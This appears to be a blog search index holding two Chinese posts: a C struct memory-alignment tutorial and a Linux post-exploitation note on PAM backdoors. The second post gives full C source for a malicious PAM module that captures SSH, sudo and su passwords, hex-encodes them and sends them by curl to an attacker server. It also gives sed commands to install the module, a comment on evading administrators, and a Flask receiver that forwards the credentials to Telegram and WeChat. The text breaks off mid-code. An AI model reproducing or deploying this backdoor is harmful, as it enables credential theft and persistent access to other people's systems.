<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>结构体内存对齐笔记</title>
      <link href="posts/40072.html"/>
      <url>posts/40072.html</url>
      
        <content type="html"><![CDATA[<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><blockquote><p>结构体是由一批数据组合而成的一种新的数据类型。组成结构型数据的每个数据称为结构型数据的成员。</p></blockquote><p>结构体类型定义的一般形式：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> 结构体名<span class="token punctuation">{</span>    type1 menberName1<span class="token punctuation">;</span>    type2 menberName2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tips:小写<code>bool</code>一字节，大写<code>BOOL</code>四字节<br><code>*</code> <code>[]</code> <code>-&gt;</code> 这三个具有间接访问功能</p><h4 id="结构体基本语法"><a href="#结构体基本语法" class="headerlink" title="结构体基本语法"></a>结构体基本语法</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token comment">/*学生结构体*/</span><span class="token keyword">struct</span> <span class="token class-name">tagStudent</span><span class="token punctuation">{</span><span class="token keyword">char</span> szName<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// +0</span><span class="token keyword">int</span> nAge<span class="token punctuation">;</span>          <span class="token comment">// +8</span>    <span class="token keyword">double</span>  dbWeight<span class="token punctuation">;</span>  <span class="token comment">//+16</span><span class="token keyword">char</span> nGender<span class="token punctuation">;</span>      <span class="token comment">//+24</span>    <span class="token keyword">float</span>  fHeight<span class="token punctuation">;</span>    <span class="token comment">//+28</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> wID<span class="token punctuation">;</span>   <span class="token comment">//+32</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">struct</span> <span class="token class-name">tagStudent</span> stu <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment">//类型描述</span><span class="token string">"Jack"</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">185.0f</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">9527</span><span class="token punctuation">,</span>true<span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">tagStudent</span><span class="token operator">*</span> pStu <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>pStu <span class="token operator">=</span> <span class="token operator">&amp;</span>stu<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%f\r\n"</span><span class="token punctuation">,</span> stu<span class="token punctuation">.</span>dbWeight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\r\n"</span><span class="token punctuation">,</span> pStu<span class="token operator">-&gt;</span>nAge<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译选项<code>/ZP1 (2 4 8 16)</code> 1 Byte  2 Byte4 Byte 8 Byte 16 Byte</p><h2 id="结构体内存对齐"><a href="#结构体内存对齐" class="headerlink" title="结构体内存对齐"></a><strong>结构体内存对齐</strong></h2><ul><li>设编译对齐值为Zp</li><li>设结构体成员的地址和结构体首地址之差为offset</li><li>设结构体成员类型为 member type</li><li>必须满足：<br><code>offset % min(Zp,sizeof(member type)) == 0</code></li></ul><p>定义结构体自身的对齐值为 <code>StructAlig</code><br><code>StructAlig = max(sizeof(menber1 type), sizeof(menber2 type),.......,sizeof(menberEnd type))</code></p><p>设整个结构体的空间长度为<code>size</code><br><code>size %  min(Zp,StructAlig) == 0</code></p><p>tips:网络通信中最简单的 对齐设为1<br>/Zp8</p><p><strong>定义某部分对齐</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span>push<span class="token punctuation">)</span> </span><span class="token comment">//保存当前对齐值（编译选项ZP），压栈</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token keyword">struct</span> <span class="token class-name">tagDOB</span><span class="token punctuation">{</span><span class="token keyword">int</span> nYear<span class="token punctuation">;</span><span class="token keyword">char</span> cMonth<span class="token punctuation">;</span>    <span class="token keyword">char</span> wDay<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//structAlig = 4 , sizeof(dob) = 8</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span> </span><span class="token comment">//出栈</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span>push<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span></span></span><span class="token keyword">struct</span> <span class="token class-name">tagStudent</span><span class="token punctuation">{</span><span class="token keyword">char</span> szName<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//</span>    <span class="token keyword">double</span>  dbWeight<span class="token punctuation">;</span>  <span class="token comment">//+</span>    <span class="token keyword">struct</span> <span class="token class-name">tagDOB</span> dob<span class="token punctuation">;</span>  <span class="token comment">//算这里的对齐值  是他自身的structAlig = 4 , sizeof(dob) = 8</span><span class="token keyword">char</span> nGender<span class="token punctuation">;</span>      <span class="token comment">//+</span>    <span class="token keyword">float</span>  fHeight<span class="token punctuation">;</span>    <span class="token comment">//+</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> wID<span class="token punctuation">;</span>   <span class="token comment">//+</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="某结构体的寻址方式"><a href="#某结构体的寻址方式" class="headerlink" title="某结构体的寻址方式"></a>某结构体的寻址方式</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span>  <span class="token class-name">tagType</span> obj<span class="token punctuation">;</span>obj<span class="token punctuation">.</span>member 的地址是：<span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>obj <span class="token operator">+</span> member offsetobj member <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>member type <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>obj <span class="token operator">+</span> member offset<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="获得结构体成员地址偏移量"><a href="#获得结构体成员地址偏移量" class="headerlink" title="获得结构体成员地址偏移量"></a>获得结构体成员地址偏移量</h4><p><code>#define GetOffset(s,m) (size_t)&amp;(((s*)NULL)-&gt;m)</code></p>]]></content>
      
      
      <categories>
          
          <category> CR逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux PAM后门学习</title>
      <link href="posts/32019.html"/>
      <url>posts/32019.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linux后渗透笔记-PAM后门"><a href="#Linux后渗透笔记-PAM后门" class="headerlink" title="Linux后渗透笔记 PAM后门"></a>Linux后渗透笔记 PAM后门</h2><p>本笔记整理自互联网和本地试验</p><h3 id="PAM知识点"><a href="#PAM知识点" class="headerlink" title="PAM知识点"></a>PAM知识点</h3><p>Linux-PAM是可插入认证模块(Pluggable Authentication Modules)，PAM使用配置/etc/pam.d/下的文件，来管理对程序的认证方式。</p><p>根据/etc/pam.d/下的各种服务配置文件，调用/lib/security下相应的模块，以加载动态链接库的形式实现需要的认证方式。</p><h3 id="PAM后门密码推送【本地篇】"><a href="#PAM后门密码推送【本地篇】" class="headerlink" title="PAM后门密码推送【本地篇】"></a>PAM后门密码推送【本地篇】</h3><h4 id="查看系统和PAM版本"><a href="#查看系统和PAM版本" class="headerlink" title="查看系统和PAM版本"></a>查看系统和PAM版本</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getconf LONG_BIT<span class="token function">cat</span> /etc/redhat-release<span class="token function">rpm</span> -qa <span class="token operator">|</span> <span class="token function">grep</span> pam<span class="token function">apt-get</span> list --installed <span class="token operator">|</span> <span class="token function">grep</span> pam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./medias/detail/load.gif" data-original="https://blog.ryzezr.com/usr/uploads/2021/05/4162790754.png"></p><p>查看 vim /etc/ssh/sshd_config,确认UsePAM是否开启</p><pre class="line-numbers language-code" data-language="code"><code class="language-code">#UsePAM noUsePAM yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="./medias/detail/load.gif" data-original="https://blog.ryzezr.com/usr/uploads/2021/05/2504756272.png"></p><p>在PAM源码中，pam_sm_authenticate函数对应认证服务，在这里截获密码。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PAM_SM_AUTH</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;security/pam_appl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;security/pam_modules.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;syslog.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdarg.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_pam_log</span><span class="token punctuation">(</span><span class="token keyword">int</span> err<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    va_list args<span class="token punctuation">;</span>    <span class="token function">va_start</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// openlog("pam_authx", LOG_CONS|LOG_PID, LOG_AUTH);</span>    <span class="token function">vsyslog</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> format<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">va_end</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">closelog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_write_log</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>content<span class="token punctuation">)</span> <span class="token punctuation">{</span>    FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> result <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>value <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> value <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>value <span class="token operator">&gt;=</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> value <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>value <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ch<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>hex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> high<span class="token punctuation">,</span>low<span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> hex <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>        tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>ch<span class="token punctuation">;</span>        high <span class="token operator">=</span> tmp <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">;</span>        low <span class="token operator">=</span> tmp <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">;</span>        <span class="token operator">*</span>hex<span class="token operator">++</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>high<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span>hex<span class="token operator">++</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>low<span class="token punctuation">)</span><span class="token punctuation">;</span>        ch<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>hex <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">pam_sm_authenticate</span><span class="token punctuation">(</span><span class="token class-name">pam_handle_t</span> <span class="token operator">*</span>pamh<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>username<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>password<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>remotehost<span class="token punctuation">;</span>    <span class="token function">pam_get_item</span><span class="token punctuation">(</span>pamh<span class="token punctuation">,</span> PAM_USER<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pam_get_item</span><span class="token punctuation">(</span>pamh<span class="token punctuation">,</span> PAM_AUTHTOK<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pam_get_item</span><span class="token punctuation">(</span>pamh<span class="token punctuation">,</span> PAM_RHOST<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>remotehost<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> PAM_AUTHINFO_UNAVAIL<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 前提开启syslog，输出在debug，三种记录方式可选择注释</span>    <span class="token comment">//_pam_log(LOG_DEBUG, "ssh auth attempt: %s entered the password %s", username, password);</span>    <span class="token keyword">char</span> cmd<span class="token punctuation">[</span><span class="token number">300</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> password_hex<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 把密码转成HexString格式</span>    <span class="token function">str_to_hex</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> password_hex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 把密码输出至/tmp/.ssh/log，并且通过HTTP协议回源到服务器</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"curl -d 'msg="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"::"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> password_hex<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//在实战中可把此处注释到，防止被管理员在/tmp目下发现异常</span>    <span class="token function">_write_log</span><span class="token punctuation">(</span><span class="token string">"/tmp/.ssh/log"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"::"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> remotehost<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"' 'http://your server ip:8443/ssh'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>PAM_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">pam_sm_setcred</span><span class="token punctuation">(</span><span class="token class-name">pam_handle_t</span> <span class="token operator">*</span>pamh<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>PAM_IGNORE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用gcc直接编译成动态链接库文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -fPIC -DPIC -shared -rdynamic -o pam_authx.so pam_authx.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="配置PAM后门"><a href="#配置PAM后门" class="headerlink" title="配置PAM后门"></a>配置PAM后门</h4><p>因为上面的代码只是针对pam_sm_authenticate函数的，为了快速编译而写的，所以还是需要用到pam_unix.so模块，它会把密码与/etc/shadow中的哈希对比。 接下来在/etc/pam.d/的对应配置文件首行加入下面两条配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Ubuntu</span>/etc/pam.d/common-auth-ys<span class="token comment"># CentOS</span>/etc/pam.d/sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-code" data-language="code"><code class="language-code">auth       required     pam_unix.soauth       required     pam_authx.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">"1iauth       required     pam_unix.so<span class="token entity" title="\n">\n</span>auth       required     pam_authx.so"</span> /etc/pam.d/sshd<span class="token function">sed</span> -i <span class="token string">"1iauth       required     pam_unix.so<span class="token entity" title="\n">\n</span>auth       required     pam_authx.so"</span> /etc/pam.d/sudo<span class="token function">sed</span> -i <span class="token string">"1iauth       required     pam_unix.so<span class="token entity" title="\n">\n</span>auth       required     pam_authx.so"</span> /etc/pam.d/su<span class="token function">sed</span> -i <span class="token string">"1iauth       required     pam_unix.so<span class="token entity" title="\n">\n</span>auth       required     pam_authx.so"</span> /etc/pam.d/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>下载目标编辑好的pam后门到目标计算机</p><h3 id="PAM后门密码推送【接收密码】"><a href="#PAM后门密码推送【接收密码】" class="headerlink" title="PAM后门密码推送【接收密码】"></a>PAM后门密码推送【接收密码】</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">from</span> flask <span class="token keyword">import</span> send_from_directory<span class="token keyword">import</span> requests<span class="token punctuation">,</span>binascii<span class="token keyword">import</span> os<span class="token comment"># nohup gunicorn -w 1 -b 0.0.0.0:8443 yourappname:app &gt; /dev/null 2&gt;&amp;1 &amp;</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/ssh"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ssh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        msg <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>to_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">)</span>        msg <span class="token operator">=</span> msg<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"::"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        msg <span class="token operator">=</span> <span class="token string">"host: "</span> <span class="token operator">+</span> msg<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\nusername: "</span> <span class="token operator">+</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token operator">+</span> <span class="token string">"\npassword: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>msg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        sendMessage<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        sendMessage_Wechat<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"200"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download/ssh"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">downloadssh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    directory <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>directory<span class="token punctuation">,</span> <span class="token string">"install_ssh.sh"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download/authx"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">downloadauthx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    directory <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>directory<span class="token punctuation">,</span> <span class="token string">"pam_authx.so"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token operator">//</span>转发推送到telegarm机器人<span class="token keyword">def</span> <span class="token function">sendMessage</span><span class="token punctuation">(</span>msg<span class="token 